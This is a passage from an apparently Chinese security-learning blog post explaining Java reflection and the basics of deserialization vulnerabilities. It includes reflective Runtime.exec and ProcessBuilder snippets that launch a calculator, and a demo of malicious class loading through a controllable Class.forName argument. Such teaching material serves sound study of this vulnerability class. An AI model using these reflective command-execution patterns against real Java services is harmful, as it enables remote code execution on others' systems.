<span class="hljs-type">Method</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">"exec"</span>, String.class);
cmd.invoke(run, <span class="hljs-string">"calc"</span>);<span class="hljs-comment">//执行函数</span></code></pre>
<p><strong>如果执行的方法是静态方法，那么 <code>invoke</code> 的第一个 obj 参数将被忽略</strong></p>
<p>比如我们要执行上面所说的 <code>Runtime</code> 类中的静态方法 <code>getRuntime()</code> 去获取对象</p>
<pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"java.lang.Runtime"</span>);
<span class="hljs-comment">//调用静态方法getRuntime()获取Runtime对象</span>
<span class="hljs-type">Runtime</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> (Runtime) clazz.getMethod(<span class="hljs-string">"getRuntime"</span>).invoke(<span class="hljs-literal">null</span>);<span class="hljs-comment">//调用的是静态方法，invoke()里参数随便写一个就行，会忽略第一个参数</span>
run.exec(<span class="hljs-string">"calc"</span>);</code></pre>
<p>等价于 <code>Runtime.getRuntime().exec("calc");</code></p>
<h2 id="反射javalangruntime">反射java.lang.Runtime</h2>
<p><code>java.lang.Runtime</code>因为有一个<code>exec</code>方法可以执行本地命令，所以在很多的<code>payload</code>中我们都能看到反射调用<code>Runtime</code>类来执行本地系统命令，通过学习如何反射<code>Runtime</code>类也能让我们理解反射的一些基础用法。</p>
<p><strong>不使用反射执行本地命令代码片段：</strong></p>
<pre><code class="hljs java"><span class="hljs-comment">// 输出命令执行结果</span>
System.out.println(org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(<span class="hljs-string">"whoami"</span>).getInputStream(), <span class="hljs-string">"UTF-8"</span>));</code></pre>
<p>如上可以看到，我们可以使用一行代码完成本地命令执行操作，但是如果使用反射就会比较麻烦了，我们不得不需要间接性的调用<code>Runtime</code>的<code>exec</code>方法。</p>
<p><strong>反射Runtime执行本地命令代码片段：</strong></p>
<pre><code class="hljs java"><span class="hljs-comment">// 获取Runtime类对象</span>
<span class="hljs-type">Class</span> <span class="hljs-variable">runtimeClass1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"java.lang.Runtime"</span>);

<span class="hljs-comment">// 获取构造方法</span>
<span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> runtimeClass1.getDeclaredConstructor();
constructor.setAccessible(<span class="hljs-literal">true</span>);

<span class="hljs-comment">// 创建Runtime类示例，等价于 Runtime rt = new Runtime();</span>
<span class="hljs-type">Object</span> <span class="hljs-variable">runtimeInstance</span> <span class="hljs-operator">=</span> constructor.newInstance();

<span class="hljs-comment">// 获取Runtime的exec(String cmd)方法</span>
<span class="hljs-type">Method</span> <span class="hljs-variable">runtimeMethod</span> <span class="hljs-operator">=</span> runtimeClass1.getMethod(<span class="hljs-string">"exec"</span>, String.class);

<span class="hljs-comment">// 调用exec方法，等价于 rt.exec(cmd);</span>
<span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> (Process) runtimeMethod.invoke(runtimeInstance, cmd);

<span class="hljs-comment">// 获取命令执行结果</span>
<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> process.getInputStream();

<span class="hljs-comment">// 输出命令执行结果</span>
System.out.println(org.apache.commons.io.IOUtils.toString(in, <span class="hljs-string">"UTF-8"</span>));</code></pre>
<p>反射调用<code>Runtime</code>实现本地命令执行的流程如下：</p>
<ol>
<li>反射获取<code>Runtime</code>类对象(<code>Class.forName("java.lang.Runtime")</code>)。</li>
<li>使用<code>Runtime</code>类的Class对象获取<code>Runtime</code>类的无参数构造方法(<code>getDeclaredConstructor()</code>)，因为<code>Runtime</code>的构造方法是<code>private</code>的我们无法直接调用，所以我们需要通过反射去修改方法的访问权限(<code>constructor.setAccessible(true)</code>)。</li>
<li>获取<code>Runtime</code>类的<code>exec(String)</code>方法(<code>runtimeClass1.getMethod("exec", String.class);</code>)。</li>
<li>调用<code>exec(String)</code>方法(<code>runtimeMethod.invoke(runtimeInstance, cmd)</code>)。</li>
</ol>
<p>上面的代码每一步都写了非常清晰的注释，接下来我们将进一步深入的了解下每一步具体含义。</p>
<h2 id="java反射到命令执行">Java反射到命令执行</h2>
<p>学习ava反射机制，其实我们更关心如何利用Java反射实现命令执行。下面是Java反射命令执行的几种情况</p>
<h3 id="demo-1">Demo 1</h3>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> 反射;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TrainPrint</span> {
    {
        System.out.printf(<span class="hljs-string">"Empty block initial %s\n"</span>, <span class="hljs-built_in">this</span>.getClass());
    }
    <span class="hljs-keyword">static</span> {
        System.out.printf(<span class="hljs-string">"Static initial %s\n"</span>, TrainPrint.class);

            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();
                String[] commands = {<span class="hljs-string">"calc"</span>};
                <span class="hljs-type">Process</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> rt.exec(commands);
                pc.waitFor();
            } <span class="hljs-keyword">catch</span> (Exception e) {
                <span class="hljs-comment">// do nothing</span>
            }

    }
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TrainPrint</span><span class="hljs-params">()</span> {
        System.out.printf(<span class="hljs-string">"Initial %s\n"</span>, <span class="hljs-built_in">this</span>.getClass());
    }
}</code></pre>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> 反射;

<span class="hljs-keyword">import</span> 反射.TrainPrint;
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        ref(<span class="hljs-string">"反射.TrainPrint"</span>);
    }
<span class="hljs-comment">//假设name 参数可控，我们使用runtime来弹计算器：</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ref</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> Exception {
        Class.forName(name);
    }
}</code></pre>
<p>可以看到在TrainPrint类中，定义了一个实例化函数块、静态初始化块以及构造函数；在exp类中，则是定义了一个main函数来调用ref函数。</p>
<p>在ref函数中，对传入的name参数，会用forName函数去加载并初始化name对应的类，而在这里也就是“反射.TrainPrint”类，而加载该类之后，回去调用类中对应的静态初始化块函数，也就是上述执行exec(“calc”)代码，最终弹出计算器。</p>
<p>而这里呢，如果我们对name可控，那就可以构造恶意类进行攻击了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240308201226123.png" alt="image-20240308201226123"></p>
<h3 id="demo-2">Demo 2</h3>
<p>下面是两种通过反射java.lang.Runtime来达到命令执行的方式。</p>
<p>由于java.lang.Runtime类的构造函数是私有的，因此不能直接使用 newInstance() 创建一个实例。那为什么这个类的构造函数会是私有的呢？</p>
<p>这涉及到一个“单例模式”的概念：</p>
<blockquote>
<p>单例模式（Singleton）的目的是为了保证在一个进程中，某个类有且仅有一个实例。因为这个类只有一个实例，因此，自然不能让调用方使用new Xyz()来创建实例了。所以，单例的构造方法必须是private，这样就防止了调用方自己创建实例，但是在类的内部，是可以用一个静态字段来引用唯一创建的实例的。举个例子：我们在链接数据库时只有最开始链接一次，而不是用一次链接一次，如果这样的话，资源消耗太大了。因此可以将类的构造函数设为私有，再通过静态方法来获取。</p>
</blockquote>
<p>由于java.lang.Runtime使用了单例模式，我们可以通过Runtime.getRuntime()来获取Runtime对象。</p>
<p>有两种方法进行反射命令执行：</p>
<h4 id="getmethod">getMethod</h4>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> RCE;

<span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;
<span class="hljs-keyword">import</span> java.lang.reflect.Method;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflect</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz;
        clazz = Class.forName(<span class="hljs-string">"java.lang.Runtime"</span>);

        <span class="hljs-type">Method</span> <span class="hljs-variable">execMethod</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">"exec"</span>, String.class);

        <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">"getRuntime"</span>);

        <span class="hljs-type">Object</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> getRuntimeMethod.invoke(clazz);

        execMethod.invoke(runtime, <span class="hljs-string">"calc.exe"</span>);
    }
}</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240308213635285.png" alt="image-20240308213635285"></p>
<p>这里由于我们无法直接实例化Runtime类，因此只能靠Java反射机制：</p>
<p>首先定义了一个Class对象clazz，然后通过forName方法，获取到了Runtime类的Class对象（也就是能得到Runtime类中的数据及方法）。随后利用getMethod方法调用了clazz（即Runtime类）中的exec方法，为后续命令执行做准备。</p>
<p>然后又通过getMethod获取到Runtime类中的getRuntime方法，接着通过invoke进行调用该方法执行：<br>
也就是执行<code>Runtime.getRuntime</code>成功获取到Runtime类的对象，并赋值给runtime实例。</p>
<p>最终用invoke方法调用了runtime实例的exec方法，并传入相应参数，成功弹出计算器。</p>
<h4 id="getdeclaredconstructor">getDeclaredConstructor</h4>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> RCE;

<span class="hljs-keyword">import</span> java.io.InputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Constructor;
<span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;
<span class="hljs-keyword">import</span> java.lang.reflect.Method;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflect</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException {

        <span class="hljs-type">Class</span> <span class="hljs-variable">runtimeClass1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"java.lang.Runtime"</span>);
        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> runtimeClass1.getDeclaredConstructor();
        constructor.setAccessible(<span class="hljs-literal">true</span>);

        <span class="hljs-type">Object</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> constructor.newInstance();
        <span class="hljs-type">Method</span> <span class="hljs-variable">runtimeMethod</span> <span class="hljs-operator">=</span> runtimeClass1.getMethod(<span class="hljs-string">"exec"</span>, String.class);

        runtimeMethod.invoke(runtime, <span class="hljs-string">"calc"</span>);
    }
}</code></pre>
<p>首先通过forName获取Runtime的Class类对象</p>
<pre><code class="hljs scss">Class对象提供了关于类或接口的结构和行为的信息，包括类的名称、父类、实现的接口、字段、方法等。</code></pre>
<p>需要注意，这里的class对象并不能直接调用某种方法，还需要利用反射机制才可</p>
<p>之后利用getDeclaredConstructor函数获取到了Runtime类中的私有构造函数，接着设置setAccessible(true)使得我们可以调用其私有构造函数。</p>
<p>接着利用constructor的newInstance就可以实例化一个Runtime类对象了，之后通过Class对象调用getMethod方法获取到Runtime类的exec方法。</p>
<p>最后利用invoke执行，弹出计算器。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309184017911.png" alt="image-20240309184017911"></p>
<p>注意：这里我用的是jdk1.8，如果是jdk9以上，对于这种反射机制会爆出如下错误：</p>
<pre><code class="hljs scss">Unable to make private java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Runtime</span>() accessible: module java.base does not <span class="hljs-string">"opens java.lang"</span> to unnamed module...</code></pre>
<p>解决办法可参考：[<a target="_blank" rel="noopener" href="https://community.temporal.io/t/getting-java-lang-reflect-inaccessibleobjectexception-when-migrated-to-java-17/6168">Getting java.lang.reflect.InaccessibleObjectException when migrated to Java 17</a>](<a target="_blank" rel="noopener" href="https://community.temporal.io/t/getting-java-lang-reflect-inaccessibleobjectexception-when-migrated-to-java-17/6168">https://community.temporal.io/t/getting-java-lang-reflect-inaccessibleobjectexception-when-migrated-to-java-17/6168</a>)</p>
<p>但这里我就换了个低版本，懒得解决了</p>
<h2 id="getconstructor和getdeclaredconstructor">getConstructor和getDeclaredConstructor</h2>
<p>这两个方法均用于获取类的构造方法，后者可以获取私有的构造方法</p>
<p>前面利用 <code>Class</code> 中的 <code>newInstance</code> 方法获取一个类对象只能是对应无参的构造函数来实例化类，而利用这两个函数可以调用类的有参构造函数来实例化一个对象。</p>
<p>这里以 <code>getConstructor</code> 为例，<code>getDeclaredConstructor</code> 用法相同只是后续要加个 <code>setAccessible(true)</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309220658043.png" alt="image-20240309220658043"></p>
<p>该方法的参数是获取到的构造方法中对应参数的数据类型，该方法返回的 <code>Constructor</code> 对象中有个 <code>newInstance</code> 方法，看看这个 <code>newInstance</code> 方法的参数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309220937467.png" alt="image-20240309220937467"></p>
<p><code>newInstance</code> 方法的参数是调用的构造方法对应的参数。比如我们利用 <code>ProcessBuilder</code> 类来执行命令</p>
<pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">"calc"</span>).start();</code></pre>
<p>注意这里用到的 <code>ProcessBuilder</code> 重载的构造方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309220959997.png" alt="image-20240309220959997"></p>
<pre><code class="hljs scss">String... command` 等价于 `String<span class="hljs-selector-attr">[]</span> command</code></pre>
<p>使用反射构造</p>
<pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"java.lang.ProcessBuilder"</span>);
((ProcessBuilder) clazz.getConstructor(String[].class).newInstance(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[][] {{<span class="hljs-string">"calc"</span>}})).start();</code></pre>
<p>简单解释下这两个参数 <code>String[].class</code> 是 <code>ProcessBuilder</code> 类构造函数的参数类型，<code>newInstance</code> 参数也是可变长参数，等价于 <code>Object[] initargs</code> ，即套两层数组 <code>new String[][] {{"calc"}}</code></p>
<p>上述用到了强制类型转换，将上述payload改改，用完全反射的方法</p>
<pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"java.lang.ProcessBuilder"</span>);
<span class="hljs-type">Constructor</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> clazz.getConstructor(String[].class);
clazz.getMethod(<span class="hljs-string">"start"</span>).invoke(m.newInstance(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[][] {{<span class="hljs-string">"calc"</span>}}));</code></pre>
<p>写成一行</p>
<pre><code class="hljs java">Class.forName(<span class="hljs-string">"java.lang.ProcessBuilder"</span>).getMethod(<span class="hljs-string">"start"</span>).invoke(Class.forName(<span class="hljs-string">"java.lang.ProcessBuilder"</span>).getConstructor(String[].class).newInstance(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[][] {{<span class="hljs-string">"calc"</span>}}));</code></pre>
<p><code>runtimeClass1.getDeclaredConstructor</code>和<code>runtimeClass1.getConstructor</code>都可以获取到类构造方法，区别在于后者无法获取到私有方法，所以一般在获取某个类的构造方法时候我们会使用前者去获取构造方法。如果构造方法有一个或多个参数的情况下我们应该在获取构造方法时候传入对应的参数类型数组，如：<code>clazz.getDeclaredConstructor(String.class, String.class)</code>。</p>
<p>如果我们想获取类的所有构造方法可以使用：<code>clazz.getDeclaredConstructors</code>来获取一个<code>Constructor</code>数组。</p>
<p>获取到<code>Constructor</code>以后我们可以通过<code>constructor.newInstance()</code>来创建类实例,同理如果有参数的情况下我们应该传入对应的参数值，如:<code>constructor.newInstance("admin", "123456")</code>。当我们没有访问构造方法权限时我们应该调用<code>constructor.setAccessible(true)</code>修改访问权限就可以成功的创建出类实例了。</p>
<h2 id="反射调用类方法">反射调用类方法</h2>
<p><code>Class</code>对象提供了一个获取某个类的所有的成员方法的方法，也可以通过方法名和方法参数类型来获取指定成员方法。</p>
<p><strong>获取当前类所有的成员方法：</strong></p>
<pre><code class="hljs java">Method[] methods = clazz.getDeclaredMethods()</code></pre>
<p><strong>获取当前类指定的成员方法：</strong></p>
<pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(<span class="hljs-string">"方法名"</span>);
<span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(<span class="hljs-string">"方法名"</span>, 参数类型如String.class，多个参数用<span class="hljs-string">","</span>号隔开);</code></pre>
<p><code>getMethod</code>和<code>getDeclaredMethod</code>都能够获取到类成员方法，区别在于<code>getMethod</code>只能获取到<code>当前类和父类</code>的所有有权限的方法(如：<code>public</code>)，而<code>getDeclaredMethod</code>能获取到当前类的所有成员方法(不包含父类)。</p>
<p><strong>反射调用方法</strong></p>
<p>获取到<code>java.lang.reflect.Method</code>对象以后我们可以通过<code>Method</code>的<code>invoke</code>方法来调用类方法。</p>
<p><strong>调用类方法代码片段：</strong></p>
<pre><code class="hljs java">method.invoke(方法实例对象, 方法参数值，多个参数值用<span class="hljs-string">","</span>隔开);</code></pre>
<p><code>method.invoke</code>的第一个参数必须是类实例对象，如果调用的是<code>static</code>方法那么第一个参数值可以传<code>null</code>，因为在java中调用静态方法是不需要有类实例的，因为可以直接<code>类名.方法名(参数)</code>的方式调用。</p>
<p><code>method.invoke</code>的第二个参数不是必须的，如果当前调用的方法没有参数，那么第二个参数可以不传，如果有参数那么就必须严格的<code>依次传入对应的参数类型</code>。</p>
<h2 id="反射调用成员变量">反射调用成员变量</h2>
<p>Java反射不但可以获取类所有的成员变量名称，还可以无视权限修饰符实现修改对应的值。</p>
<p><strong>获取当前类的所有成员变量：</strong></p>
<pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">fields</span> <span class="hljs-operator">=</span> clazz.getDeclaredFields();</code></pre>
<p><strong>获取当前类指定的成员变量：</strong></p>
<pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">field</span>  <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">"变量名"</span>);</code></pre>
<p><code>getField</code>和<code>getDeclaredField</code>的区别同<code>getMethod</code>和<code>getDeclaredMethod</code>。</p>
<p><strong>获取成员变量值：</strong></p>
<pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> field.get(类实例对象);</code></pre>
<p><strong>修改成员变量值：</strong></p>
<pre><code class="hljs java">field.set(类实例对象, 修改后的值);</code></pre>
<p>同理，当我们没有修改的成员变量权限时可以使用: <code>field.setAccessible(true)</code>的方式修改为访问成员变量访问权限。</p>
<p>如果我们需要修改被<code>final</code>关键字修饰的成员变量，那么我们需要先修改方法</p>
<pre><code class="hljs java"><span class="hljs-comment">// 反射获取Field类的modifiers</span>
<span class="hljs-type">Field</span> <span class="hljs-variable">modifiers</span> <span class="hljs-operator">=</span> field.getClass().getDeclaredField(<span class="hljs-string">"modifiers"</span>);

<span class="hljs-comment">// 设置modifiers修改权限</span>
modifiers.setAccessible(<span class="hljs-literal">true</span>);

<span class="hljs-comment">// 修改成员变量的Field对象的modifiers值</span>
modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);

<span class="hljs-comment">// 修改成员变量值</span>
field.set(类实例对象, 修改后的值);</code></pre>
<h1 id="0x02-什么是java序列化与反序列化">0x02 什么是Java序列化与反序列化</h1>
<p>在编程语言的世界当中,常常有这样的需求,我们需要将本地已经<strong>实例化</strong>的某个<strong>对象</strong>,通过<strong>网络</strong>传递到其他机器当中.为了满足这种需求,就有了所谓的序列化和反序列化</p>
<pre><code class="hljs scss">Java:
<span class="hljs-number">1</span>. 序列化：将Java对象压缩成字节序列或字节流的形式
<span class="hljs-number">2</span>. 反序列化：将字节序列或字节流转化成Java对象</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231209184427823.png" alt="image-20231209184427823"></p>
<p>对象的序列化主要有两种用途：</p>
<ol>
<li>
<p>把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；（持久化对象）</p>
</li>
<li>
<p>在网络上传送对象的字节序列。（网络传输对象）</p>
</li>
</ol>
<h1 id="0x03-漏洞成因">0x03 漏洞成因</h1>
<blockquote>
<p>只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力。</p>
</blockquote>
<h2 id="31-可能的形式">3.1 可能的形式</h2>
<ol>
<li>入口类的readObject直接调用危险方法</li>
<li>入口类参数中包含可控类，该类有危险方法，readObject时调用</li>
<li>入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用</li>
</ol>
<blockquote>
<p>比如类型定义为Object，调用equals/hashcode/toString<br>
<strong>相同类型  同名函数</strong></p>
</blockquote>
<ol start="4">
<li>构造函数/静态代码块等类加载时隐式执行</li>
</ol>
<h2 id="32-java原生反序列化漏洞成因">3.2 JAVA原生反序列化漏洞成因</h2>
<blockquote>
<p>Java中间件通常通过网络接收客户端发送的序列化数据，而在服务端对序列化数据进行反序列化时，会调用被序列化对象的readObject()方法。</p>
<p>而在Java中如果重写了某个类的方法，就会优先调用经过修改后的方法。</p>
<p>如果某个对象重写了readObject()方法，且在方法中能够执行任意代码，那服务端在进行反序列化时，也会执行相应代码</p>
</blockquote>
<p>简单来说：攻击者通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的恶意代码。</p>
<h1 id="0x04-java反序列化基础">0x04 Java反序列化基础</h1>
<p>不同于PHP序列化是将对象转换成了字符串，Java序列化是将对象转换为了字节流，且序列化与反序列化是一种思想，并不局限于其实现形式。如：</p>
<ul>
<li>JAVA内置的<code>writeObject()/readObject()</code></li>
<li>JAVA内置的<code>XMLDecoder()/XMLEncoder</code></li>
<li><code>XStream</code></li>
<li><code>SnakeYaml</code></li>
<li><code>FastJson</code></li>
<li><code>Jackson</code></li>
</ul>
<p>出现过漏洞的组件：</p>
<ul>
<li>Apache Shiro</li>
<li>Apache Axis</li>
<li>Weblogic</li>
<li>Jboss</li>
<li>Fastjson</li>
</ul>
<p>看一下Java中执行系统命令的方法：</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception{
        Runtime.getRuntime().exec(<span class="hljs-string">"calc.exe"</span>);
    }
}</code></pre>
<pre><code class="hljs scss">Java中执行系统命令使用java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Runtime</span>类的exec方法：
	以上函数可以弹出计算器
	<span class="hljs-built_in">getRuntime</span>()是Runtime类中的静态方法,使用此方法获取当前java程序的<span class="hljs-built_in">Runtime</span>(即运行时:计算机程序运行需要的代码库,框架,平台等)
	exec底层为ProcessBuilder:此类用于创建操作系统进程，每个ProcessBuilder实例管理进程属性的集合。 
	<span class="hljs-built_in">start</span>()方法使用这些属性创建一个新的Process实例。 
	<span class="hljs-built_in">start</span>()方法可以从同一实例重复调用，以创建具有相同或相关属性的新子进程。</code></pre>
<p><strong>注意:这里的命令执行,并不是使用系统中的bash或是cmd进行的系统命令执行，而是使用JAVA本身，所以反弹shell的重定向符在JAVA中并不支持</strong></p>
<p>我们来细分一下上述执行命令的步骤：</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception{
        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getruntime();
        runtime.exec(<span class="hljs-string">"calc.exe"</span>);
    }
}</code></pre>
<p>那么相应的反射的代码如下</p>
<pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Method;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExecTest</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception{
        <span class="hljs-type">Object</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"java.lang.Runtime"</span>).getMethod(<span class="hljs-string">"getRuntime"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{}).invoke(<span class="hljs-literal">null</span>);
        <span class="hljs-comment">//System.out.println(runtime.getClass().getName());</span>
    Class.forName(<span class="hljs-string">"java.lang.Runtime"</span>).getMethod(<span class="hljs-string">"exec"</span>,String.class).invoke(runtime,<span class="hljs-string">"calc.exe"</span>);
    }
}</code></pre>
<p><code>getMethod(方法名, 方法类型)</code><br>
<code>invoke(某个对象实例， 传入参数)</code></p>
<p>这里第一句<code>Object runtime = Class.forName("java.lang.Runtime")</code>的作用等价于 <code>Object runtime = Runtime.getRuntime()</code></p>
<p>目的是获取一个对象实例好被下一个invoke调用</p>
<p>第二句<code>Class.forName("java.lang.Runtime").xxxx</code>的作用就是调用上一步生成的<code>runtime</code>实例的<code>exec</code>方法，并将<code>"calc.exe"</code>参数传入<code>exec()</code>方法</p>
<p>接下来编写Java反序列化过程：</p>
<p>在Java当中，如果一个类需要被序列化和反序列化 ，需要实现<code>java.io.Serializable</code>接口</p>
<p><code>ObjectOutputStream</code>类的<code>writeObject(Object obj)</code>方法，将对象序列化成字符串数据</p>
<p><code>ObjectInputStream</code>类的<code>readObject(Object obj)</code>方法，将字符串数据反序列化成对象</p>
<pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Serialize</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception{
        <span class="hljs-comment">//要序列化的数据</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">"hybcx"</span>;

        <span class="hljs-comment">//序列化</span>
        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">"serialize1.txt"</span>);
        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fileOutputStream);
        objectOutputStream.writeObject(name);
        objectOutputStream.close();

        <span class="hljs-comment">//反序列化</span>
        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">"serialize1.txt"</span>);
